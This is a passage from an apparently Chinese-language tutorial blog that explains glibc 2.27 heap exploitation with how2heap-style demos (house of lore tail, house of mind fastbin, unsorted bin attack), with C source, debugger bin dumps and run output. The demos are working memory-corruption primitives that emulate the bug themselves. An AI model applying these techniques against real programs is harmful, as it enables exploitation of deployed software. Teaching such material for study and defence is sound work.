class="built_in">malloc</span>, which putting <span class="built_in">stack</span> address on smallbin <span class="built_in">list</span></span><br><span class="line">Set the bk pointer to stack_buffer_2 and <span class="built_in">set</span> the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last <span class="built_in">malloc</span>, which returning pointer to the fake chunk on stackSet the bck pointer of stack_buffer_2 to the fake <span class="built_in">free</span>-<span class="built_in">list</span> in order to prevent crash prevent crash introduced by smallbin-to-tcache mechanism</span><br><span class="line">Allocating another large chunk in order to avoid consolidating the top chunk withthe small one during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line">Allocated the large chunk on the heap at 0x55555555bae0</span><br><span class="line">Freeing dummy chunk</span><br><span class="line">Freeing the chunk 0x55555555b260, it will be inserted in the unsorted bin</span><br><span class="line"></span><br><span class="line">In the unsorted bin the victim's fwd and bk pointers are nil</span><br><span class="line">victim-&gt;fwd: 0x7ffff7dcfca0</span><br><span class="line">victim-&gt;bk: 0x7ffff7dcfca0</span><br><span class="line"></span><br><span class="line">Now performing a <span class="built_in">malloc</span> that can't be handled by the UnsortedBin, nor the small bin</span><br><span class="line">This means that the chunk 0x55555555b260 will be inserted in front of the SmallBin</span><br><span class="line">The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x55555555bed0</span><br><span class="line">The victim chunk has been sorted and its fwd and bk pointers updated</span><br><span class="line">victim-&gt;fwd: 0x7ffff7dcfda0</span><br><span class="line">victim-&gt;bk: 0x7ffff7dcfda0</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">Now take all dummies chunk in tcache out</span><br><span class="line">Now allocating a chunk with size equal to the first one freed</span><br><span class="line">This should <span class="keyword">return</span> the overwritten victim chunk and <span class="built_in">set</span> the bin-&gt;bk to the injected victim-&gt;bk pointer</span><br><span class="line">This last <span class="built_in">malloc</span> should trick the glibc <span class="built_in">malloc</span> to <span class="keyword">return</span> a chunk at the position injected in bin-&gt;bk</span><br><span class="line">p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">The fwd pointer of stack_buffer_2 has changed after the last <span class="built_in">malloc</span> to <span class="number">0x7fffffffdcf0</span></span><br><span class="line"></span><br><span class="line">p4 is <span class="number">0x7fffffffdc70</span> and should be on the <span class="built_in">stack</span>!</span><br><span class="line">Nice jump d00d</span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-mind-fastbin-arena"><a href="#house-of-mind-fastbin-arena" class="headerlink" title="house_of_mind_fastbin(arena)"></a>house_of_mind_fastbin(arena)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"House of Mind - Fastbin Variant\n"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"=================================="</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The goal of this technique is to create a fake arena\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"at an offset of HEAP_MAX_SIZE\n"</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Then, we write to the fastbins when the chunk is freed\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This creates a somewhat constrained WRITE-WHERE primitive\n"</span>);</span><br><span class="line">	<span class="comment">// Values for the allocation information.	</span></span><br><span class="line">	<span class="type">int</span> HEAP_MAX_SIZE = <span class="number">0x4000000</span>;</span><br><span class="line">	<span class="type">int</span> MAX_SIZE = (<span class="number">128</span>*<span class="number">1024</span>) - <span class="number">0x100</span>; <span class="comment">// MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Find initial location of the heap\n"</span>);</span><br><span class="line">	<span class="comment">// The target location of our attack and the fake arena to use</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); </span><br><span class="line">	<span class="type">uint8_t</span>* target_loc = fake_arena + <span class="number">0x30</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* target_chunk = (<span class="type">uint8_t</span>*) fake_arena - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Prepare a valid 'malloc_state' (arena) 'system_mem' </span></span><br><span class="line"><span class="comment">	to store a fastbin. This is important because the size</span></span><br><span class="line"><span class="comment">	of a chunk is validated for being too small or too large</span></span><br><span class="line"><span class="comment">	via the 'system_mem' of the 'malloc_state'. This just needs</span></span><br><span class="line"><span class="comment">	to be a value larger than our fastbin chunk.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Set 'system_mem' (offset 0x888) for fake arena\n"</span>);</span><br><span class="line">	fake_arena[<span class="number">0x888</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x889</span>] = <span class="number">0xFF</span>; </span><br><span class="line">	fake_arena[<span class="number">0x88a</span>] = <span class="number">0xFF</span>; </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Target Memory Address for overwrite: %p\n"</span>, target_loc);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Must set data at HEAP_MAX_SIZE (0x%x) offset\n"</span>, HEAP_MAX_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Calculate the location of our fake arena</span></span><br><span class="line">	<span class="type">uint64_t</span> new_arena_value = (((<span class="type">uint64_t</span>) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fake_heap_info = (<span class="type">uint64_t</span>*) new_arena_value;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake Heap Info struct location: %p\n"</span>, fake_heap_info);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocate until we reach a MAX_HEAP_SIZE offset\n"</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	The fake arena must be at a particular offset on the heap.</span></span><br><span class="line"><span class="comment">	So, we allocate a bunch of chunks until our next chunk</span></span><br><span class="line"><span class="comment">	will be in the arena. This value was calculated above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span>((<span class="type">long</span> <span class="type">long</span>)user_mem &lt; new_arena_value){</span><br><span class="line">		user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this later to trigger craziness</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Create fastbin sized chunk to be victim of attack\n"</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fastbin_chunk = <span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// Size of 0x60</span></span><br><span class="line">	<span class="type">uint64_t</span>* chunk_ptr = fastbin_chunk - <span class="number">2</span>; <span class="comment">// Point to chunk instead of mem</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fastbin Chunk to overwrite: %p\n"</span>, fastbin_chunk);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fill up the TCache so that the fastbin will be used\n"</span>);</span><br><span class="line">	<span class="comment">// Fill the tcache to make the fastbin to be used later. </span></span><br><span class="line">	<span class="type">uint64_t</span>* tcache_chunks[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++){</span><br><span class="line">		tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	}	</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++){</span><br><span class="line">		<span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Create a FAKE malloc_state pointer for the heap_state</span></span><br><span class="line"><span class="comment">	This is the 'ar_ptr' of the 'heap_info' struct shown above. </span></span><br><span class="line"><span class="comment">	This is the first entry in the 'heap_info' struct at offset 0x0</span></span><br><span class="line"><span class="comment">	 at the heap.</span></span><br><span class="line"><span class="comment">	We set this to the location where we want to write a value to.</span></span><br><span class="line"><span class="comment">	The location that gets written to depends on the fastbin chunk</span></span><br><span class="line"><span class="comment">	size being freed. This will be between an offset of 0x8 and 0x40</span></span><br><span class="line"><span class="comment">	bytes. For instance, a chunk with a size of 0x20 would be in the</span></span><br><span class="line"><span class="comment">	0th index of fastbinsY struct. When this is written to, we will</span></span><br><span class="line"><span class="comment">	write to an offset of 8 from the original value written.</span></span><br><span class="line"><span class="comment">	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Setting 'ar_ptr' (our fake arena)  in heap_info struct to %p\n"</span>, fake_arena);</span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="type">uint64_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr (arena)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Target Write at %p prior to exploitation: 0x%x\n"</span>, target_loc, *(target_loc));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Set the non-main arena bit on the size. </span></span><br><span class="line"><span class="comment">	Additionally, we keep the size the same as the original</span></span><br><span class="line"><span class="comment">	allocation because there is a sanity check on the fastbin (when freeing)</span></span><br><span class="line"><span class="comment">	that the next chunk has a valid size. </span></span><br><span class="line"><span class="comment">	When grabbing the non-main arena, it will use our choosen arena!</span></span><br><span class="line"><span class="comment">	From there, it will write to the fastbin because of the size of the</span></span><br><span class="line"><span class="comment">	chunk.</span></span><br><span class="line"><span class="comment">	///// Vulnerability! Overwriting the chunk size </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Set non-main arena bit on the fastbin chunk\n"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n"</span>);</span><br><span class="line">	chunk_ptr[<span class="number">1</span>] = <span class="number">0x60</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//// End vulnerability </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The offset being written to with the fastbin chunk address</span></span><br><span class="line"><span class="comment">	depends on the fastbin BEING used and the malloc_state itself. </span></span><br><span class="line"><span class="comment">	In 2.27, the offset from the beginning of the malloc_state</span></span><br><span class="line"><span class="comment">	to the fastbinsY array is 0x10. Then, fastbinsY[0x4] is an </span></span><br><span class="line"><span class="comment">	additional byte offset of 0x20. In total, the writing offset</span></span><br><span class="line"><span class="comment">	from the arena location is 0x30 bytes.</span></span><br><span class="line"><span class="comment">	from the arena location to where the write actually occurs. </span></span><br><span class="line"><span class="comment">	This is a similar concept to bk - 0x10 from the unsorted</span></span><br><span class="line"><span class="comment">	bin attack. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"When we free the fastbin chunk with the non-main arena bit\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"set, it will cause our fake 'heap_info' struct to be used.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This will dereference our fake arena location and write\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"the address of the heap to an offset of the arena pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Trigger the magic by freeing the chunk!\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(fastbin_chunk); <span class="comment">// Trigger the madness</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// For this particular fastbin chunk size, the offset is 0x28. </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Target Write at %p: 0x%llx\n"</span>, target_loc, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*) (target_loc)));</span><br><span class="line">	assert(*((<span class="type">unsigned</span> <span class="type">long</span> *) (target_loc)) != <span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这个利用手法可以使得通过伪造arena以将一个chunk中的值变得很大，首先先malloc(0x1000)这里的空间是用来伪造arena的，所以用fake_arena来表示。</p>
<p>除了fake_arena还定义了<code>HEAP_MAX_SIZE=0x4000000</code>，<code>MAX_SIZE=(128*1024) - 0x100</code>。接下来<code>Set 'system_mem' (offset 0x888) for fake arena</code>为什么需要这样？看下面的源码就可以知道了。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">				   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): memory corruption"</span>);</span><br></pre></td></tr></tbody></table></figure>

<p><code>chunksize_nomask(victim) &gt; av-system_mem</code>需要绕过这个条件，也就是请求的内存不能大于system_mem。所以我们才需要将system_mem设置为0xFFFFFF。还需要计算一下fake_arena的管理空间位置，后面会用到的。现在一直分配<code>MAX_SIZE</code>大小的chunk直到<code>user_mem &lt; new_arena_value</code>，这里分配的是0x1ff00大小，为什么需要这个大小而不是更大的chunk？因为mmap_threshold=0x20000，它表示当用户分配大于0x20000的空间时，就不使用堆而是直接通过mmap获取了。malloc(0x50)到堆上，并填满tcache。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x60</span> [  <span class="number">7</span>]: <span class="number">0x555558028790</span> —▸ <span class="number">0x555558028730</span> —▸ <span class="number">0x5555580286d0</span> —▸ <span class="number">0x555558028670</span> —▸ <span class="number">0x555558028610</span> —▸ <span class="number">0x5555580285b0</span> —▸ <span class="number">0x555558028550</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></tbody></table></figure>

<p>将fake_heap_info的ar_ptr给设置成fake_arena，接着<code>Setting the non-main arena bit</code>也就是修改0x60 chunk的non_main_arena标志位。释放掉第一次的0x50的堆块，这个时候libc会根据_heap_info的ar_ptr找到我们的假chunk并更改chunk的内容达到目的</p>
<p>运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">House of Mind - Fastbin Variant</span><br><span class="line">==================================</span><br><span class="line">The goal of this technique is to create a fake arena</span><br><span class="line">at an offset of HEAP_MAX_SIZE</span><br><span class="line">Then, we write to the fastbins when the chunk is freed</span><br><span class="line">This creates a somewhat constrained WRITE-WHERE primitive</span><br><span class="line">Find initial location of the heap</span><br><span class="line">Set <span class="string">'system_mem'</span> (offset <span class="number">0x888</span>) <span class="keyword">for</span> fake arena</span><br><span class="line">Target Memory Address <span class="keyword">for</span> overwrite: <span class="number">0x55555555b6a0</span></span><br><span class="line">Must <span class="built_in">set</span> data at HEAP_MAX_SIZE (<span class="number">0x4000000</span>) offset</span><br><span class="line">Fake Heap Info <span class="keyword">struct</span> location: <span class="number">0x555558000000</span></span><br><span class="line">Allocate until we reach a MAX_HEAP_SIZE offset</span><br><span class="line">Create fastbin sized chunk to be victim of attack</span><br><span class="line">Fastbin Chunk to overwrite: <span class="number">0x5555580284f0</span></span><br><span class="line">Fill up the TCache so that the fastbin will be used</span><br><span class="line">Setting <span class="string">'ar_ptr'</span> (our fake arena)  in heap_info <span class="keyword">struct</span> to <span class="number">0x55555555b670</span></span><br><span class="line">Target Write at <span class="number">0x55555555b6a0</span> prior to exploitation: <span class="number">0x0</span></span><br><span class="line">Set non-main arena bit on the fastbin chunk</span><br><span class="line">NOTE: This keeps the next chunk size valid because the actual chunk size was never changed</span><br><span class="line"></span><br><span class="line">When we <span class="built_in">free</span> the fastbin chunk with the non-main arena bit</span><br><span class="line"><span class="built_in">set</span>, it will cause our fake <span class="string">'heap_info'</span> <span class="keyword">struct</span> to be used.</span><br><span class="line">This will dereference our fake arena location and write</span><br><span class="line">the address of the heap to an offset of the arena pointer.</span><br><span class="line">Trigger the magic by freeing the chunk!</span><br><span class="line">Target Write at <span class="number">0x55555555b6a0</span>: <span class="number">0x5555580284e0</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="unsorted-bin-attack-1"><a href="#unsorted-bin-attack-1" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique only works with buffers not going into tcache, either because the tcache-option for "</span></span><br><span class="line">		    <span class="string">"glibc was disabled, or because the buffers are bigger than 0x408 bytes. See build_glibc.sh for build "</span></span><br><span class="line">		    <span class="string">"instructions.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the "</span></span><br><span class="line">		   <span class="string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's first look at the target we want to rewrite on stack:\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %ld\n\n"</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate first normal chunk on the heap at: %p\n"</span>,p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another normal chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">           <span class="string">"the first one during the free()\n\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer "</span></span><br><span class="line">		   <span class="string">"point to %p\n"</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">	p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n"</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's malloc again to get the chunk we just free. During this time, the target should have already been "</span></span><br><span class="line">		   <span class="string">"rewritten:\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;stack_var, (<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">	assert(stack_var != <span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>和2.23下的攻击手法差不多，申请出一个unsorted bin大小的chunk，并放入unsortedbin中，malloc(500)是为了防止与top_chunk合并。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555b250</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x55555555b250</span></span><br></pre></td></tr></tbody></table></figure>

<p>假设有一个漏洞可以改unsortedbin的bk为stack_var  - 2，再申请的时候会将stack_var这里的值改成Unsorted Bin的值，为什么？看下面的unsortedbin的摘除代码，如果控制了bk之后我们是不是就可以控制unsorted_chunks (av)到任意地址。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x7fffffffdc70</span></span><br><span class="line"><span class="number">0x7fffffffdc70</span>:	<span class="number">0x00007fffffffdc90</span>	<span class="number">0x0000555555555339</span></span><br><span class="line"><span class="number">0x7fffffffdc80</span>:	<span class="number">0x00007ffff7dcfca0</span>	<span class="number">0x000055555555b260</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span 